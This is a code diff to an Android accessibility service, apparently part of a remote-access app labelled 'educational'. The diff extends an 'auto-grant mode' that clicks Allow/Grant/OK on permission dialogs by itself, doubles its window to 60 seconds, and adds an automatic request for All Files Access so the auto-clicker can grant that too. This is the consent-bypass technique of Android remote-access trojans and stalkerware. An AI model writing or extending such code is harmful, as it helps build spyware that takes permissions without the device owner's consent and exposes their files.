@@ -436,15 +436,31 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
     }
 
-    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 30 seconds. */
+    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 60 seconds.
+     *  Also triggers MANAGE_EXTERNAL_STORAGE (All Files Access) settings screen so
+     *  the user is prompted and the auto-clicker can grant it too.
+     */
     private void startAutoGrantTimer() {
         autoGrantMode = true;
         autoGrantHandler = new Handler(Looper.getMainLooper());
+
+        // Trigger All Files Access settings screen after a short delay (let dialogs settle first)
+        autoGrantHandler.postDelayed(() -> {
+            try {
+                com.remoteaccess.educational.permissions.AutoPermissionManager apm =
+                    new com.remoteaccess.educational.permissions.AutoPermissionManager(this);
+                if (!apm.hasManageExternalStorage()) {
+                    apm.requestManageExternalStorage();
+                    Log.i(TAG, "Auto-grant: requested MANAGE_EXTERNAL_STORAGE settings screen");
+                }
+            } catch (Exception ignored) {}
+        }, 3_000);
+
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 30 seconds");
-        }, 30_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 30s");
+            Log.i(TAG, "Auto-grant mode expired after 60 seconds");
+        }, 60_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 60s");
     }
 
     /** Clicks permission-granting buttons: Allow, Grant, OK, Allow all time, etc. */
